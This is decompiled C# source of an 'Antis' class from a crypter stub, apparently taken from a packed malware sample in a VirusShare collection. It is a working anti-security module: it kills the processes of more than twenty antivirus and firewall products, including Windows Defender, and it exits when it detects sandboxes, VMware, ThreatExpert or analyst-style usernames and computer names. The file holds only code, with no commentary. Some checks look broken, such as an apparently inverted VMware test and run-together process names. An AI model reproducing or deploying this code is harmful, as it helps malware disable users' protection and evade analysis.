// Decompiled with JetBrains decompiler
// Type: CrypterStub_3.Antis
// Assembly: stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CC59236E-CD0D-4D40-B77F-1ED5634210EB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Packed.MSIL.MSILPack.a-8a83fb0e4f9119b394393045640f3034dc3b68978c5e30f10212750b094b67d9.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace CrypterStub_3
{
  public class Antis
  {
    [DebuggerNonUserCode]
    public Antis()
    {
    }

    public static void Enable()
    {
      Antis.mofo();
      Antis.AntiAntiGen();
      Antis.AntiAsquared();
      Antis.AntiAvast();
      Antis.AntiAVG();
      Antis.AntiBullGuard();
      Antis.AntiClamAV();
      Antis.AntiComodo();
      Antis.AntiEstNod32();
      Antis.AntiEwido();
      Antis.AntiFPROT6();
      Antis.AntiKaspersky();
      Antis.AntiMcAfee();
      Antis.AntiNorton();
      Antis.AntiOfficeScan();
      Antis.AntiOutPost();
      Antis.AntiPCCillin();
      Antis.AntiServerProtect();
      Antis.AntiSpySweeper();
      Antis.AntiThreatExpert();
      Antis.AntiVirtualPC();
      Antis.AntiZoneAlarm();
    }

    public static void AntiSandboxie(Form frmSelect)
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        if (!frmSelect.Text.Contains("#"))
          goto label_4;
label_3:
        num3 = 3;
        frmSelect.Close();
        ProjectData.EndApp();
label_4:
        goto label_11;
label_6:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
              case 5:
                goto label_4;
              case 6:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void AntiMcAfee()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "mcagentmcuimgr", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiAVG()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "avgemc", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiAsquared()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "a2servic", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiAvast()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "ashWebSv", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiClamAV()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "clamauto", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiComodo()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "cpf", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiEwido()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "ewido", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiFPROT6()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "FPAVServer", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiKaspersky()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "kavsvc", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiBullGuard()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "BullGuard", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiZoneAlarm()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "VSMON", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiAntiGen()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "antigen", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiNorton()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "ccapp", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiOfficeScan()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "tmlisten", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiPCCillin()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "pccntmon", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiServerProtect()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "earthagent", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiSpySweeper()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "spysweeper", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiVirtualPC()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "vpcmapvmsrvc", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiOutPost()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "acs.exe", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void AntiEstNod32()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "nod32.exenod32krn.exeekrn.exe", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    public static void mofo()
    {
      Antis.seekit("MSASCui");
      Antis.seekit("msmpeng");
      Antis.AntiSandboxie();
      Antis.IsVmWare();
      Antis.AntiThreatExpert();
      Antis.checkUsername();
      Antis.checkComputername();
    }

    private static void seekit(string gay1)
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        if (process.ProcessName.Contains(gay1))
        {
          try
          {
            process.Kill();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        checked { ++index; }
      }
    }

    private static void checkUsername()
    {
      List<string> stringList = new List<string>();
      stringList.Add("UserName");
      stringList.Add("User");
      stringList.Add("honey");
      stringList.Add("sandbox");
      stringList.Add("currentuser");
      stringList.Add("User");
      try
      {
        foreach (string Right in stringList)
        {
          if (Operators.CompareString(Environment.UserName, Right, false) == 0)
            Environment.Exit(0);
        }
      }
      finally
      {
        List<string>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }

    private static void checkComputername()
    {
      List<string> stringList = new List<string>();
      stringList.Add("ComputerName");
      stringList.Add("COMPUTERNAME");
      stringList.Add("DELL-D3E62F7E26");
      stringList.Add("DWI-9625AC2E275");
      stringList.Add("MICHAEL-F156CF7");
      try
      {
        foreach (string Right in stringList)
        {
          if (Operators.CompareString(Environment.MachineName, Right, false) == 0)
            Environment.Exit(0);
        }
      }
      finally
      {
        List<string>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }

    public static void AntiSandboxie()
    {
      if (Process.GetProcessesByName("SbieSvc").Length < 1)
        return;
      Environment.Exit(0);
    }

    public static void IsVmWare()
    {
      string str1 = "VMDragDetectWndClass";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      if (Antis.FindWindow(ref local1, ref local2) != 0L)
        return;
      Environment.Exit(0);
    }

    private static void AntiThreatExpert()
    {
      if (!Process.GetCurrentProcess().MainModule.FileName.Contains("sample"))
        return;
      Environment.Exit(0);
    }
  }
}
